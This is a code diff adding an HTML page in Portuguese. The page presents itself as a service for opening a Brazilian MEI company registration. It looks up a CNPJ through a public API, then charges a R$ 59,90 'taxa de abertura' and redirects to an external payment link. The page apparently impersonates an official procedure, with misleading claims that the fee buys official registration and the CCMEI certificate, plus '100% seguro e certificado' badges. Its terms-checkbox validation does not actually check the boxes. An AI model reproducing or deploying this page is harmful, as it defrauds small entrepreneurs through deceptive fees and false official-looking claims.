+            <div class="progress-section">
+                <div class="progress-header">
+                    <h2 class="progress-title">Abertura de CNPJ MEI</h2>
+                    <p class="progress-subtitle">Processo simplificado em 2 etapas</p>
+                </div>
+                
+                <div class="progress-steps">
+                    <div class="progress-line"></div>
+                    <div class="progress-line-active" id="progressLineActive"></div>
+                    
+                    <div class="step active" data-step="1">
+                        <div class="step-circle">1</div>
+                        <div class="step-label">Dados do CNPJ</div>
+                    </div>
+                    <div class="step" data-step="2">
+                        <div class="step-circle">2</div>
+                        <div class="step-label">Pagamento</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Formulário Principal -->
+            <div class="form-container">
+                <!-- Etapa 1: Dados do CNPJ -->
+                <div class="step-content active" id="step1">
+                    <div class="form-header">
+                        <h1 class="form-title">Dados do CNPJ</h1>
+                        <p class="form-subtitle">Informe o CNPJ da sua empresa para iniciar o processo</p>
+                    </div>
+                    
+                    <div class="form-content">
+                        <form id="cnpjForm">
+                            <div class="form-group">
+                                <label class="form-label required" for="cnpj">CNPJ</label>
+                                <div style="position: relative;">
+                                    <input type="text" id="cnpj" name="cnpj" class="form-input" maxlength="18" placeholder="00.000.000/0000-00" inputmode="numeric">
+                                </div>
+                                <div class="error-message" id="cnpjError">Digite um CNPJ válido</div>
+                                <div class="loading-indicator" id="cnpjLoadingIndicator">
+                                    <div class="spinner"></div>
+                                    <span>Buscando dados do CNPJ...</span>
+                                </div>
+                            </div>
+
+                            <!-- Seção de Informações do CNPJ -->
+                            <div class="cnpj-info-display" id="cnpjInfoDisplay" style="display: none;">
+                                <h3>
+                                    <i class="fas fa-check-circle"></i>
+                                    Dados da Empresa
+                                </h3>
+                                <div class="cnpj-info-grid" id="cnpjInfoGrid">
+                                    <!-- Dados serão preenchidos dinamicamente -->
+                                </div>
+                            </div>
+
+                            <!-- Mensagem de Aguardando Pagamento -->
+                            <div class="waiting-payment" id="waitingPayment" style="display: none;">
+                                <div class="waiting-payment-icon">⏳</div>
+                                <div class="waiting-payment-text">Aguardando pagamento da taxa de abertura</div>
+                            </div>
+
+                            <div class="button-group">
+                                <button type="submit" class="btn btn-primary">
+                                    <i class="fas fa-search"></i>
+                                    Buscar CNPJ
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <!-- Etapa 2: Pagamento -->
+                <div class="step-content" id="step2">
+                    <div class="form-header">
+                        <h1 class="form-title">Confirmação e Finalização</h1>
+                        <p class="form-subtitle">Revise seus dados e finalize o processo de abertura do MEI</p>
+                    </div>
+                    
+                    <div class="form-content">
+                        <!-- Seção de Informações do CNPJ (Resumo) -->
+                        <div class="info-section">
+                            <div class="info-section-header">
+                                <i class="fas fa-building info-section-icon"></i>
+                                <h3 class="info-section-title">Dados da Empresa</h3>
+                            </div>
+                            <div class="info-section-content">
+                                <div class="cnpj-info-grid" id="paymentCnpjInfoGrid">
+                                    <!-- Dados serão preenchidos dinamicamente -->
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SEÇÃO: Comunicado sobre Taxa de Abertura -->
+                        <div class="fee-notice-section">
+                            <div class="fee-notice-header">
+                                <i class="fas fa-info-circle fee-notice-icon"></i>
+                                <h3 class="fee-notice-title">Informações sobre Taxa de Abertura</h3>
+                            </div>
+                            <div class="fee-notice-content">
+                                <p class="fee-notice-text">
+                                    Para finalizar o processo de abertura do seu MEI, é necessário o pagamento da taxa de processamento e formalização. 
+                                    Este valor cobre todos os custos administrativos e garante a emissão dos documentos oficiais.
+                                </p>
+                                
+                                <div class="fee-highlight-box">
+                                    <div class="fee-amount">R$ 59,90</div>
+                                    <div class="fee-description">Taxa única de abertura e formalização</div>
+                                </div>
+
+                                <p class="fee-notice-text">
+                                    <strong>O que está incluído na taxa:</strong>
+                                </p>
+                                
+                                <ul class="fee-benefits-list">
+                                    <li>Processamento completo da documentação</li>
+                                    <li>Registro oficial no Portal do Empreendedor</li>
+                                    <li>Emissão do Certificado da Condição de MEI (CCMEI)</li>
+                                    <li>Inscrição Municipal e Estadual (quando aplicável)</li>
+                                    <li>Suporte especializado durante todo o processo</li>
+                                    <li>Entrega dos documentos digitais por e-mail</li>
+                                </ul>
+
+                                <p class="fee-notice-text">
+                                    <strong>Importante:</strong> Esta é uma taxa única e não há custos adicionais. 
+                                    Após o pagamento, você receberá todos os documentos necessários para iniciar suas atividades como MEI.
+                                </p>
+                            </div>
+                        </div>
+
+                        <div class="declaration-section">
+                            <h3 class="declaration-title">
+                                <i class="fas fa-exclamation-triangle"></i>
+                                Declaração e Termos
+                            </h3>
+                            <p class="declaration-text">
+                                Ao prosseguir, você declara que leu e aceita os Termos de Uso e a Política de Privacidade, 
+                                confirma que as informações fornecidas são verdadeiras e autoriza o processamento dos seus 
+                                dados conforme a Lei Geral de Proteção de Dados (LGPD).
+                            </p>
+                            
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="termsAccept" name="termsAccept" class="checkbox-input" required>
+                                <label for="termsAccept" class="checkbox-label">
+                                    Declaro que li e aceito os <strong>Termos de Uso</strong> e a <strong>Política de Privacidade</strong>
+                                </label>
+                            </div>
+                            
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="dataAccuracy" name="dataAccuracy" class="checkbox-input" required>
+                                <label for="dataAccuracy" class="checkbox-label">
+                                    Confirmo que todas as informações fornecidas são <strong>verdadeiras e precisas</strong>
+                                </label>
+                            </div>
+                            
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="lgpdConsent" name="lgpdConsent" class="checkbox-input" required>
+                                <label for="lgpdConsent" class="checkbox-label">
+                                    Autorizo o processamento dos meus dados pessoais conforme a <strong>LGPD</strong>
+                                </label>
+                            </div>
+
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="feeAcknowledge" name="feeAcknowledge" class="checkbox-input" required>
+                                <label for="feeAcknowledge" class="checkbox-label">
+                                    Estou ciente da <strong>taxa de abertura de R$ 59,90</strong> e dos serviços incluídos
+                                </label>
+                            </div>
+                        </div>
+
+                        <form id="confirmationForm">
+                            <div class="button-group">
+                                <button type="button" class="btn btn-secondary" onclick="goToStep(1)">
+                                    <i class="fas fa-arrow-left"></i>
+                                    Voltar
+                                </button>
+                                <button type="submit" class="btn btn-primary">
+                                    <i class="fas fa-credit-card"></i>
+                                    Pagar e Finalizar (R$ 59,90)
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Sidebar -->
+        <aside class="sidebar">
+            <div class="summary-card">
+                <h3 class="summary-title">Resumo do Processo</h3>
+                
+                <div class="price-display">
+                    <div class="price-label">Taxa de Abertura MEI</div>
+                    <div class="price-value">R$ 59,90</div>
+                </div>
+            </div>
+
+            <div class="trust-section">
+                <h3 class="trust-title">Garantias e Benefícios</h3>
+                
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="trust-text">Processo 100% seguro e certificado</div>
+                </div>
+                
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="trust-text">Abertura em até 48 horas úteis</div>
+                </div>
+                
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="trust-text">Suporte especializado incluído</div>
+                </div>
+                
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="trust-text">Documentos digitais enviados por email</div>
+                </div>
+                
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="trust-text">Conformidade com legislação vigente</div>
+                </div>
+                
+                <div class="trust-item">
+                    <div class="trust-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="trust-text">Garantia de satisfação</div>
+                </div>
+            </div>
+        </aside>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Processando solicitação...</div>
+        </div>
+    </div>
+
+    <!-- Notificação de Sucesso -->
+    <div class="success-notification" id="successNotification">
+        ✅ Dados validados com sucesso!
+    </div>
+
+    <script>
+        // ===== VARIÁVEIS GLOBAIS =====
+        let currentStep = 1;
+        let cnpjData = null;
+        let isProcessing = false;
+
+        // ===== UTILITÁRIOS =====
+        function debounce(func, delay) {
+            let timeoutId;
+            return function (...args) {
+                clearTimeout(timeoutId);
+                timeoutId = setTimeout(() => func.apply(this, args), delay);
+            };
+        }
+
+        function showSuccessNotification(message) {
+            const notification = document.getElementById('successNotification');
+            if (notification) {
+                notification.textContent = message;
+                notification.style.display = 'block';
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 3000);
+            }
+        }
+
+        // ===== NAVEGAÇÃO ENTRE ETAPAS =====
+        function goToStep(stepNumber) {
+            const steps = document.querySelectorAll('.step-content');
+            const progressSteps = document.querySelectorAll('.step');
+            const progressLineActive = document.getElementById('progressLineActive');
+
+            steps.forEach((step, index) => {
+                step.classList.remove('active');
+                if (index + 1 === stepNumber) {
+                    step.classList.add('active');
+                }
+            });
+
+            progressSteps.forEach((step, index) => {
+                const stepNumber_attr = step.getAttribute('data-step');
+                step.classList.remove('active', 'completed');
+                
+                if (parseInt(stepNumber_attr) === stepNumber) {
+                    step.classList.add('active');
+                } else if (parseInt(stepNumber_attr) < stepNumber) {
+                    step.classList.add('completed');
+                }
+            });
+
+            const progressWidth = ((stepNumber - 1) / (progressSteps.length - 1)) * 100;
+            if (progressLineActive) {
+                progressLineActive.style.width = `${progressWidth}%`;
+            }
+
+            currentStep = stepNumber;
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // ===== MÁSCARA DE CNPJ =====
+        function applyCNPJMask(value) {
+            return value
+                .replace(/\D/g, '')
+                .replace(/^(\d{2})(\d)/, '$1.$2')
+                .replace(/^(\d{2})\.(\d{3})(\d)/, '$1.$2.$3')
+                .replace(/\.(\d{3})(\d)/, '.$1/$2')
+                .replace(/(\d{4})(\d)/, '$1-$2');
+        }
+
+        // ===== BUSCA DE CNPJ =====
+        async function handleCNPJLookup() {
+            const cnpjInput = document.getElementById('cnpj');
+            const cnpj = cnpjInput.value.replace(/\D/g, '');
+            const loadingIndicator = document.getElementById('cnpjLoadingIndicator');
+            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
+            const waitingPayment = document.getElementById('waitingPayment');
+            const errorEl = document.getElementById('cnpjError');
+
+            if (cnpj.length !== 14) {
+                cnpjInfoDisplay.style.display = 'none';
+                waitingPayment.style.display = 'none';
+                cnpjInput.classList.remove('success');
+                if (errorEl) errorEl.classList.remove('show');
+                return;
+            }
+
+            if (isProcessing) return;
+            isProcessing = true;
+
+            if (loadingIndicator) {
+                loadingIndicator.classList.add('show');
+            }
+
+            try {
+                const response = await fetch(`https://receitaws.com.br/v1/cnpj/${cnpj}`, {
+                    signal: AbortSignal.timeout(5000)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Erro na requisição');
+                }
+
+                const data = await response.json();
+
+                await new Promise(resolve => setTimeout(resolve, 400));
+
+                if (data.status === 'OK') {
+                    cnpjData = data;
+                    displayCNPJInfo(data);
+                    cnpjInput.classList.add('success');
+                    cnpjInput.classList.remove('error');
+                    if (errorEl) errorEl.classList.remove('show');
+                    cnpjInfoDisplay.style.display = 'block';
+                    waitingPayment.style.display = 'block';
+                    showSuccessNotification('CNPJ encontrado com sucesso!');
+                } else {
+                    showCNPJError('CNPJ não encontrado ou inválido');
+                }
+            } catch (error) {
+                console.error('Erro ao buscar CNPJ:', error);
+                showCNPJError('Erro ao buscar CNPJ. Tente novamente.');
+            } finally {
+                if (loadingIndicator) {
+                    loadingIndicator.classList.remove('show');
+                }
+                isProcessing = false;
+            }
+        }
+
+        function displayCNPJInfo(data) {
+            const cnpjInfoGrid = document.getElementById('cnpjInfoGrid');
+            const paymentCnpjInfoGrid = document.getElementById('paymentCnpjInfoGrid');
+
+            const infoItems = [
+                { label: 'CNPJ', value: data.cnpj },
+                { label: 'Razão Social', value: data.nome },
+                { label: 'Nome Fantasia', value: data.fantasia || '-' },
+                { label: 'Atividade Principal', value: data.atividade_principal?.text || '-' },
+                { label: 'Situação', value: data.situacao || '-' },
+                { label: 'Tipo', value: data.tipo || '-' }
+            ];
+
+            const htmlContent = infoItems.map(item => `
+                <div class="cnpj-info-item">
+                    <span class="cnpj-info-label">${item.label}</span>
+                    <span class="cnpj-info-value">${item.value}</span>
+                </div>
+            `).join('');
+
+            if (cnpjInfoGrid) cnpjInfoGrid.innerHTML = htmlContent;
+            if (paymentCnpjInfoGrid) paymentCnpjInfoGrid.innerHTML = htmlContent;
+        }
+
+        function showCNPJError(message) {
+            const cnpjInput = document.getElementById('cnpj');
+            const errorEl = document.getElementById('cnpjError');
+            const cnpjInfoDisplay = document.getElementById('cnpjInfoDisplay');
+            const waitingPayment = document.getElementById('waitingPayment');
+
+            cnpjInput.classList.add('error');
+            cnpjInput.classList.remove('success');
+            if (errorEl) {
+                errorEl.textContent = message;
+                errorEl.classList.add('show');
+            }
+            cnpjInfoDisplay.style.display = 'none';
+            waitingPayment.style.display = 'none';
+        }
+
+        // ===== HANDLERS DE FORMULÁRIO =====
+        function handleCNPJFormSubmit(e) {
+            e.preventDefault();
+            handleCNPJLookup();
+        }
+
+        async function handleConfirmationSubmit(e) {
+            e.preventDefault();
+
+            const checkboxes = e.target.querySelectorAll('input[type="checkbox"][required]');
+            let allChecked = true;
+
+            checkboxes.forEach(checkbox => {
+                if (!checkbox.checked) {
+                    allChecked = false;
+                    checkbox.style.outline = '2px solid var(--error-color)';
+                } else {
+                    checkbox.style.outline = 'none';
+                }
+            });
+
+            if (!allChecked) {
+                alert('Por favor, aceite todos os termos para continuar.');
+                return;
+            }
+
+            const submitBtn = e.target.querySelector('button[type="submit"]');
+            const loadingOverlay = document.getElementById('loadingOverlay');
+
+            if (submitBtn) submitBtn.classList.add('btn-loading');
+            if (loadingOverlay) loadingOverlay.style.display = 'flex';
+
+            try {
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                window.location.href = 'https://pay.pag-br.com/r/9dOX973JjTo82i04E1';
+            } catch (error) {
+                console.error('Erro:', error);
+                alert('Erro ao processar solicitação. Tente novamente.');
+            } finally {
+                if (submitBtn) submitBtn.classList.remove('btn-loading');
+                if (loadingOverlay) loadingOverlay.style.display = 'none';
+            }
+        }
+
+        // ===== INICIALIZAÇÃO =====
+        document.addEventListener('DOMContentLoaded', function() {
+            // Formulário CNPJ
+            const cnpjForm = document.getElementById('cnpjForm');
+            if (cnpjForm) {
+                cnpjForm.addEventListener('submit', handleCNPJFormSubmit);
+            }
+
+            // Máscara de CNPJ
+            const cnpjInput = document.getElementById('cnpj');
+            if (cnpjInput) {
+                cnpjInput.addEventListener('input', function(e) {
+                    const cursorPosition = e.target.selectionStart;
+                    const oldValue = e.target.value;
+                    const newValue = applyCNPJMask(oldValue);
+
+                    if (newValue !== oldValue) {
+                        e.target.value = newValue;
+                        const newCursorPosition = cursorPosition + (newValue.length - oldValue.length);
+                        e.target.setSelectionRange(newCursorPosition, newCursorPosition);
+                    }
+
+                    // Busca automática quando CNPJ está completo
+                    if (newValue.replace(/\D/g, '').length === 14) {
+                        handleCNPJLookup();
+                    }
+                });
+            }
+
+            // Formulário de Confirmação
+            const confirmationForm = document.getElementById('confirmationForm');
+            if (confirmationForm) {
+                confirmationForm.addEventListener('submit', handleConfirmationSubmit);
+            }
+        });
+    </script>
+</body>
+</html>
+
